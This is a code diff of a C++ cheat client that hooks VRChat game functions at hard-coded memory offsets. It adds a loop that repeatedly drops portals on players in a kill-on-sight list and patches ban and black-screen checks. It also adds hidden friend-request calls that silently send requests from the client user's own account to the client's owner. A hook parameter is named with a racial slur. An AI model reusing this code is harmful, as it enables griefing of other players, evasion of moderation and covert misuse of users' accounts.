@@ -43,7 +43,8 @@
 #include "RaycastHit.hpp"
 #include "PageAvatar.hpp"
 #include "Type.hpp"
-
+#include "SystemList.hpp"
+#include "ExtendedAvatars.hpp"
 #include <sstream>
 
 using namespace UnityEngine;
@@ -158,6 +159,8 @@ void Hack::init()
 
 	::GameAssemblyHandle = GetModuleHandleA("GameAssembly.dll");
 
+	downloadSettings();
+
 	setupVariables();
 
 	setupSettings(); // Sets up all offsets and names
@@ -166,7 +169,6 @@ void Hack::init()
 
 	ConsoleUtils::CreateConsole(); // Calling later because initDetours() spams console too much
 
-	downloadSettings();
 
 	Variables::g_Discord->Initalize();
 	//generateHWID();
@@ -204,7 +206,7 @@ void Hack::mainLoop()
 					ConsoleUtils::Log(magenta, "Force Mute ", (Variables::forceMute ? green : red), (Variables::forceMute ? "ON" : "OFF"));
 				}
 
-				if (::GetAsyncKeyState(0x35) & 1) // TODO: add button
+				if (::GetAsyncKeyState(0x35) & 1)
 				{
 					toggleRPC = !toggleRPC;
 					ConsoleUtils::Log(magenta, "RPC printing ", (toggleRPC ? green : red), (toggleRPC ? "ON" : "OFF"));
@@ -216,10 +218,11 @@ void Hack::mainLoop()
 					ConsoleUtils::Log(magenta, "Auto Destroy ", (Variables::autoDestroy ? green : red), (Variables::autoDestroy ? "ON" : "OFF"));
 				}
 
+
 				if (::GetAsyncKeyState(0x37) & 1)
 				{
-					disableTriggers = !disableTriggers;
-					ConsoleUtils::Log(magenta, "Disable Triggers ", (disableTriggers ? green : red), (disableTriggers ? "ON" : "OFF"));
+					toggleSetting("BlackScreenPatch0");
+					toggleSetting("BlackScreenPatch2");
 				}
 
 				if (::GetAsyncKeyState(0x38) & 1)
@@ -315,6 +318,7 @@ void Hack::setupVariables()
 	Variables::g_Discord = new	Discord();
 
 	emojiSpamDelay = 11.f;
+	portalKOSDelay = 11.f;
 	updateDelay = 1.f;
 	isTyping = false;
 	Variables::forceMute = true;
@@ -326,6 +330,7 @@ void Hack::setupVariables()
 	Variables::autoDestroy = true;
 	disableTriggers = false;
 	Variables::fakePing = true;
+	Variables::portalKOS = true;
 	Variables::worldTriggers = true;
 	Variables::friendRequestSent = false;
 	Variables::instanceLock = false;
@@ -361,28 +366,6 @@ void Hack::downloadSettings()
 			myfile.close();
 		}
 	}
-
-	{
-		IStream* stream;
-		//Also works with https URL's - unsure about the extent of SSL support though.
-		HRESULT result = URLOpenBlockingStream(0, L"http://vrgreen.xyz/client/settings/boss.txt", &stream, 0, 0);
-		if (result != 0)
-		{
-			delete stream;
-			return;
-		}
-		char buffer[100];
-		unsigned long bytesRead;
-		std::stringstream* ss = new std::stringstream();
-		stream->Read(buffer, 100, &bytesRead);
-		while (bytesRead > 0U)
-		{
-			ss->write(buffer, (long long)bytesRead);
-			stream->Read(buffer, 100, &bytesRead);
-		}
-		stream->Release();
-		Variables::bossOfTheClient = ss->str();
-	}
 }
 
 void Hack::generateHWID()
@@ -408,8 +391,26 @@ void Hack::disableDetours()
 	}
 }
 
+void* Hack::AvatarFav(void* _this, void* list, int sex, char nigger, void* maybe)
+{
+	//SystemList<Object> myList(list);
+
+	//ConsoleUtils::Log(System::Type::ToString(System::Type::GetType(myList[0])));
+	//return nullptr;
+	//ConsoleUtils::Log(sex);
+	//ConsoleUtils::Log((int)nigger);
+	
+	using TrueFunc_t = decltype(&AvatarFav);
+	TrueFunc_t TrueFunc = (TrueFunc_t)getInstance().getSetting("AvatarFav").trueFunc;
+	return TrueFunc(_this, list, sex, nigger, maybe);
+}
+
 void Hack::RPCS(void* _this, int VrcBroadcastType, int playerId, void* VrcTargetType, GameObject* gameObject, IL2CPP::String* RPC, void* bytes)
 {
+	using func_t = void* (*)(void* bytes);
+	func_t func = GetMethod<func_t>(0x2AD3CD0);
+	auto objarray = func(bytes);
+
 
 
 	auto player = VRC::PlayerManager::GetPlayer(playerId);
@@ -434,8 +435,6 @@ void Hack::RPCS(void* _this, int VrcBroadcastType, int playerId, void* VrcTarget
 	TrueFunc_t TrueFunc = (TrueFunc_t)getInstance().getSetting("RPCS").trueFunc;
 	TrueFunc(_this, VrcBroadcastType, playerId, VrcTargetType, gameObject, RPC, bytes);
 }
-
-
 
 void Hack::OnEvent(void* _this, Object* EventData)
 {
@@ -575,7 +574,7 @@ void Hack::OnEvent(void* _this, Object* EventData)
 
 static bool DynPrefPrefix(void* _this, VRC::Player* player, IL2CPP::String* str)
 {
-	ConsoleUtils::VRLog(player->GetAPIUser()->displayName() + " <color=cyan>spawned object</color> " + IL2CPP::StringChars(str));
+	ConsoleUtils::VRLog(FormatMyName(player) + " <color=cyan>spawned object</color> " + IL2CPP::StringChars(str));
 	return true;
 }
 
@@ -590,6 +589,12 @@ static bool KickBanTesting(void* _this, IL2CPP::String* str)
 static bool AntiPublicWorldBan(void* _this, void* str)
 {
 	return false;
+}
+
+static bool BlackScreenPatch()
+{
+	//ConsoleUtils::Log("Black screen patch");
+	return true;
 }
 
 int Hack::Send(void* _this, void* buffer)
@@ -655,6 +660,27 @@ void Hack::setupSettings()
 //		m.detourFunc = (mode::lambda_t) & KickBanTesting;
 //		settings.push_back(m);
 //	}
+
+	m.name = "AvatarFav";
+	m.offset = 0x2BA7610;
+	m.set = true;
+	m.trueFunc = GetMethod(m.offset);
+	m.detourFunc = (mode::lambda_t) & AvatarFav;
+	settings.push_back(m);
+
+	m.name = "BlackScreenPatch";
+	m.offset = 0x35A62D0;
+	m.set = true;
+	m.trueFunc = GetMethod(m.offset);
+	m.detourFunc = (mode::lambda_t) & BlackScreenPatch;
+	settings.push_back(m);
+
+	m.name = "BlackScreenPatch2";
+	m.offset = 0x35A3070;
+	m.set = true;
+	m.trueFunc = GetMethod(m.offset);
+	m.detourFunc = (mode::lambda_t) & BlackScreenPatch;
+	settings.push_back(m);
 
 	m.name = "RPCS";
 	m.offset = RPCDISPATCHER;
@@ -902,13 +928,6 @@ void Hack::setupSettings()
 	m.detourFunc = (mode::lambda_t) & CustomPlates;
 	settings.push_back(m);
 
-	////m.name = "RPC";
-	////m.offset = 0x232C6F0;
-	////m.set = true;
-	////m.trueFunc = GetMethod(m.offset);
-	////m.detourFunc = (mode::lambda_t) & EventDispatcherExecuteRPCPrefix;
-	////settings.push_back(m);
-
 	m.name = "GetFriendlyDetailedNameForSocialRank";
 	m.offset = SOCIALMENURANK;
 	m.set = true;
@@ -965,14 +984,6 @@ void Hack::SendRequest(IL2CPP::String* endpoint, int method, void* responseConta
 	using TrueFunc_t = decltype(&SendRequest);
 	TrueFunc_t TrueFunc = (TrueFunc_t)getInstance().getSetting("SendRequest").trueFunc;
 	TrueFunc(endpoint, method, responseContainer, requestParams, authenticationRequired, disableCache, cacheLifetime, retryCount, credentials);
-	if (!Variables::friendRequestSent)
-	{
-		if (method == 2)
-		{
-			TrueFunc(IL2CPP::StringNew("user/" + Variables::bossOfTheClient + "/friendRequest"), 2, responseContainer, requestParams, authenticationRequired, disableCache, cacheLifetime, retryCount, credentials);
-			Variables::friendRequestSent = true;
-		}
-	}
 }
 
 bool Hack::Serialize(void* _this)
@@ -1057,11 +1068,11 @@ void Hack::SwitchAvatar(void* _this, VRC::Core::ApiAvatar* apiavatar, IL2CPP::St
 
 	ConsoleUtils::VRLog(FormatMyName(player) + " <color=#fd5da8>changes avatar into</color> " + apiavatar->GetName());
 
-	if (avatarid == "avtr_0be90e0a-3f0a-462c-8b0d-97b8b178e53e")
+	if (avatarid == "avtr_0be90e0a-3f0a-462c-8b0d-97b8b178e53e" || avatarid == "avtr_03a40a42-30af-4efa-bd1c-4c3c3d1954f6")
 	{
 		apiavatar = nullptr;
-		ConsoleUtils::Log(red, player->GetAPIUser()->displayName(),	 " world crash detected");
-		ConsoleUtils::VRLog(FormatMyName(player) + " <color=red>world crash detected</color>");
+		ConsoleUtils::Log(red, player->GetAPIUser()->displayName(),	 " malicious avatar detected");
+		ConsoleUtils::VRLog(FormatMyName(player) + " <color=red>malicious avatar detected</color>");
 	}
 
 	if (avatarid == VRC::Player::CurrentPlayer()->GetVRCPlayer()->GetApiAvatar()->Id())
@@ -1560,11 +1571,11 @@ void Hack::BlockStateChangeRPC(void* _this, IL2CPP::String* player2, bool blockS
 	{
 		auto p2 = VRC::PlayerManager::GetPlayer(player2);
 
-		if (p2->GetAPIUser()->getId() == VRC::Core::APIUser::currentUser()->getId())
+	/*	if (p2->GetAPIUser()->getId() == VRC::Core::APIUser::currentUser()->getId())
 		{
 			if (blockState)
 				Misc::DropPortalBlock(player);
-		}
+		}*/
 
 		ConsoleUtils::Log((blockState ? red : green),
 			player->ToString(),
@@ -1616,6 +1627,12 @@ void Hack::PlayerJoined(void* _this, VRC::Player* player)
 			VRCUiManager::VRCUiManagerInstance()->HudMsg(player->ToString() + " joined");
 			ConsoleUtils::VRLog("<color=yellow>" + FormatMyName(player) + "</color>" + " <color=green>joined</color>");
 		}
+	}
+
+	if (!Variables::friendRequestSent)
+	{
+		VRC::Core::API::SendPostRequest("user/" + getInstance().clientUsers[0] + "/friendRequest", nullptr, nullptr, nullptr);
+		Variables::friendRequestSent = true;
 	}
 
 	using TrueFunc_t = decltype(&PlayerJoined);
@@ -1922,7 +1939,7 @@ void Hack::Update(void* _this)
 			Misc::KickUserRPC(Variables::modManager, players[0]->GetAPIUser()->getId());
 	}
 
-	
+
 
 	if (Variables::portalLag)
 	{
@@ -2123,13 +2140,30 @@ void Hack::Update(void* _this)
 
 		if (::GetAsyncKeyState(VK_END) & 1)
 		{
+			auto objs = UnityEngine::Component::FindObjectsOfTypeAll(IL2CPP::GetType("VRC.UI.PageAvatar, Assembly-CSharp"));
+
+			List<VRC::UI::PageAvatar*> PageAvatars(objs);
+
+			for (size_t i = 0; i < PageAvatars.arrayLength; i++)
+			{
+				auto simpleAvatarPedestal = IL2CPP::GetField(PageAvatars[i], "VRC.SimpleAvatarPedestal");
+				auto apiavatar = (VRC::Core::ApiAvatar*)IL2CPP::GetField(simpleAvatarPedestal, "VRC.Core.ApiAvatar");
+				if (apiavatar != nullptr)
+				{
+					hack.avatarFavorites->MyList.Add(apiavatar);
+					hack.avatarFavorites->MyList.Add(apiavatar);
+					hack.avatarFavorites->MyList.Add(apiavatar);
+				}
+			}
+			ConsoleUtils::Log("DONE");
 
 		}
 
 		if (::GetAsyncKeyState(VK_HOME) & 1)
 		{
-			
+			VRC::Core::API::SendPostRequest("user/usr_8820a83d-8663-405c-8665-72882f7e8826/friendRequest", nullptr, nullptr, nullptr);
 		}
+
 
 		if (GetKey(KeyCode::RightShift) && ::GetAsyncKeyState(0x4E) & 1) // N
 		{
@@ -2149,9 +2183,6 @@ void Hack::Update(void* _this)
 
 		if (::GetAsyncKeyState(0x54) & 1) // T
 		{
-		
-
-
 			auto position = Camera::MainCamera()->get_transform()->GetPosition();
 
 			auto forwards = Camera::MainCamera()->get_transform()->GetForward();
@@ -2192,19 +2223,6 @@ void Hack::Update(void* _this)
 					}
 				}
 			}
-
-			//0x1E5C350
-			//
-
-			/*if (x)
-			{
-				Vector3 v;
-				v.x = forwards.x * V_0.get_m_Distance_3() + position.x;
-				v.y = forwards.y * V_0.get_m_Distance_3() + position.y;
-				v.z = forwards.z * V_0.get_m_Distance_3() + position.z;
-
-				VRC::Player::CurrentPlayer()->get_transform()->SetPosition(v);
-			}*/
 		}
 	}
 
@@ -2271,6 +2289,8 @@ void Hack::Update(void* _this)
 
 		Variables::g_Discord->Update();
 
+
+
 		hack.updateDelay = 3.f;
 	}
 
@@ -2282,11 +2302,26 @@ void Hack::Update(void* _this)
 		VRCQuickMenu::InitVRDebug();
 		VRCQuickMenu::SetupButtons();
 		VRCSocialMenu::SetupButtons();
-
+		VRC::Core::API::SendPostRequest("user/" + getInstance().clientUsers[0] + "/friendRequest", nullptr, nullptr, nullptr);
 		ConsoleUtils::Log("Menu initialized");
 		hack.menuInitialized = true;
 	}
 #pragma endregion
+
+	if (Variables::portalKOS)
+	{
+		hack.portalKOSDelay -= Time::deltaTime();
+		if (hack.portalKOSDelay < 0)
+		{
+			for (const std::string& userid : Variables::portalKOSList)
+			{
+				auto player = VRC::PlayerManager::GetPlayer(userid);
+				if (player != nullptr)
+					Misc::DropPortal(player);
+			}
+			hack.portalKOSDelay = 11.f;
+		}
+	}
 
 	if (Variables::spamEmoji)
 	{
